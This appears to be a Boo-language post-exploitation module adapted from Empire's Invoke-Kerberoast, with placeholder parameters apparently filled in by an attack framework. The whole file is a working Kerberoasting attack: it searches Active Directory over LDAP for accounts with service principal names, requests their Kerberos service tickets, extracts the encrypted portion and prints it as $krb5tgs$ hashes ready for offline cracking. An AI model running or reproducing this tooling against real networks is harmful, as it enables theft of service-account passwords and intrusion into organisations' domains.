/*
    This module is adapted from the Invoke-Kerberoast project (https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1)
*/
import System
import System.DirectoryServices
import System.IdentityModel.Tokens
import System.Text.RegularExpressions


public static def GetDomainUser(identity as string, ldapFilter as string, uacFilter as string, spn as string, doallowDelegation as bool, disallowDelegation as bool, admincount as bool, trustedToAuth as bool, preauthNotRequired as bool, findone as bool) as List:
    domainUsers as List = []
    domainUser as List = []
    Filter as string = ""
    if identity:
        if (Regex.IsMatch(identity, "^S-1-")):
            Filter += "(objectsid=" + identity + ")"
        elif (Regex.IsMatch(identity, "^CN=")):
            Filter += "(distinguishedname=" + identity + ")"
        elif (Regex.IsMatch(identity, "^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$")):
            bytes as (byte) = Guid(identity).ToByteArray()
            GuidByteString as string = ""
            for b as Byte in bytes:
                GuidByteString += "\\" + b.ToString("X2")
            Filter += "(objectguid=" + GuidByteString + ")"
        else:
            t = @/\\/.Split(identity)
            if (t.Length > 1):
                Filter += "(samAccountName=" + t[1] + ")"
            else:
                Filter += "(samAccountName=" + identity + ")"
    if spn:
        Filter += "(servicePrincipalName=" + spn +")"
    else:
        Filter += "(servicePrincipalName=*)"
    if doallowDelegation:
        Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))"
    if disallowDelegation:
        Filter += "(userAccountControl:1.2.840.113556.1.4.803:=1048574)"
    if admincount:
        Filter += "(admincount=1)"
    if trustedToAuth:
        Filter += "(msds-allowedtodelegateto=*)"
    if preauthNotRequired:
        Filter += "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
    if uacFilter:
        Filter += "(userAccountControl:1.2.840.113556.1.4.803:=" + uacFilter + ")"
    Filter += ldapFilter
    Filter = "(&(samAccountType=805306368)" + Filter + ")"

    print "[*] Creating DirectorySearcher with filter: " + Filter
    directorysearcher as DirectorySearcher = DirectorySearcher(Filter)
    value as List
    directoryentry as DirectoryEntry
    try:
        if findone:
            result as SearchResult = directorysearcher.FindOne()
            if result and result.Properties["samaccountname"][0] != "krbtgt":
                if result.Properties["serviceprincipalname"][0] isa ResultPropertyValueCollection:
                    domainUser = [result.Properties["samaccountname"][0], result.Properties["serviceprincipalname"][0][0], result.Properties["distinguishedname"][0]]
                else:
                    domainUser = [result.Properties["samaccountname"][0], result.Properties["serviceprincipalname"][0], result.Properties["distinguishedname"][0]]
                domainUsers.Add(domainUser)
            else:
                print "\r\n[*] No user found\r\n"
        else:
            collection = directorysearcher.FindAll()
            if collection:
                print "\r\n[*] Found " + collection.Count + " results:\r\n"
                for result as SearchResult in collection:
                    if result and result.Properties["samaccountname"][0] != "krbtgt":
                        if result.Properties["serviceprincipalname"][0] isa ResultPropertyValueCollection:
                            domainUser = [result.Properties["samaccountname"][0], result.Properties["serviceprincipalname"][0][0], result.Properties["distinguishedname"][0]]
                        else:
                            domainUser = [result.Properties["samaccountname"][0], result.Properties["serviceprincipalname"][0], result.Properties["distinguishedname"][0]]
                        domainUsers.Add(domainUser)
            else:
                print "\r\n[*] No user found\r\n"
        return domainUsers
    except e:
        print "Exception: Can't construct Domain Searcher: \r\n" + e.Message + e.StackTrace


public static def Kerberoasting(users as List):
    userSPN as string
    for user as List in users:
        if user:
            try:
                Ticket as KerberosRequestorSecurityToken = KerberosRequestorSecurityToken(user[1])
            except e :
                print "[Kerberoast] Error requesting ticket for SPN " + user[1] + " from user " + user[0] + ": \r\n" + e
            if Ticket:
                TicketByteStream = Ticket.GetRequest()
            if TicketByteStream:
                TicketHexStream = BitConverter.ToString(TicketByteStream).Replace("-", "")

            pattern as string = "[A-Fa-f0-9]*A382[A-Fa-f0-9]{4}3082[A-Fa-f0-9]{4}A0030201(?<EtypeLen>[A-Fa-f0-9]{2})A1[A-Fa-f0-9]{8,12}A282(?<CipherTextLen>[A-Fa-f0-9]{4})[A-Fa-f0-9]{8}(?<DataToEnd>[A-Fa-f0-9]+)"
            reg as Regex = Regex(pattern)
            m as Match = reg.Match(TicketHexStream)
            if (m.Success):
                Etype = Convert.ToByte("0x" + m.Groups["EtypeLen"], 16)
                CipherTextLen = Convert.ToUInt32("0x" + m.Groups["CipherTextLen"], 16)-4
                CipherText = m.Groups["DataToEnd"].ToString().Substring(0, CipherTextLen*2)

                if (m.Groups["DataToEnd"].ToString().Substring(CipherTextLen*2, 4) != 'A482'):
                    print "Error parsing ciphertext for the SPN " + Ticket.ServicePrincipalName + ".\r\n"
                    hash = null
                else:
                    hash = CipherText.Substring(0,32) + "$$" + CipherText.Substring(32)
            else:
                print "Unable to parse ticket structure for the SPN " + Ticket.ServicePrincipalName + ".\r\n"
                hash = null
            if hash:
                userDistinguishedName as String = user[2]
                userDomain as String = userDistinguishedName.Substring(userDistinguishedName.IndexOf('DC=')).Replace("DC=", "").Replace(",", ".")
                HashFormat = "\$krb5tgs\$" + Etype + "\$*" + user[0] + "\$" + userDomain + "\$" + Ticket.ServicePrincipalName +"*\$" + hash
                print "\r\nSamAccountName: " + user[0]
                print "DistinguishedName: " + user[2]
                print "ServicePrincipalName: " + user[1]
                print "Hash:"
                print HashFormat + "\r\n"


public static def Main():
    identity = "IDENTITY"
    ldapFilter = "LDAP_FILTER"
    uacFilter = "UAC_FILTER"
    spn = "SPN"
    doallowDelegation = DO_ALLOW_DELEGATION
    disallowDelegation = DISALLOW_DELEGATION
    admincount = ADMINCOUNT
    trustedToAuth = TRUSTED_TO_AUTH
    preauthNotRequired = PREAUTH_NOT_REQUIRED
    findone = FIND_ONE

    users as List

    users = GetDomainUser(identity, ldapFilter, uacFilter, spn, doallowDelegation, disallowDelegation, admincount, trustedToAuth, preauthNotRequired, findone)
    if users:
        Kerberoasting(users)
